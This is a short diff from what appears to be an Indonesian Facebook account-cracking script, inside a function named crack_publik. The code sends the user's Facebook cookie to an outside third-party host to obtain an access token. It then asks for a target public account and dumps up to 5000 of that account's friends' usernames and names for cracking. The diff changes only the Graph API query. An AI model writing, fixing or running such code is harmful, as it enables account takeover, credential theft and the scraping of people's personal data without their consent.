@@ -923,7 +923,7 @@ def crack_publik(t,c):
     eaab = ses.get('http://merchapi.pythonanywhere.com/v2/generate_token?type=eaab&cookie='+ coki).json()
     akun = input(f' [{hh}<{P}] Pastikan Akun Bersifat Publik \n Akun : ')
     try:
-        bas = ses.get(f'https://graph.facebook.com/v2.0/{akun}/?fields=friends.limit(5000)&access_token={eaab["token"]}',cookies=c).json()
+        bas = ses.get(f'https://graph.facebook.com/v2.0/{akun}/friends?fields=id,name&limit=5000&access_token={eaab["token"]}',cookies=c).json()
         for pi in bas['data']:
             try:
                 try:dump.append(pi['username']+'|'+pi['name'])
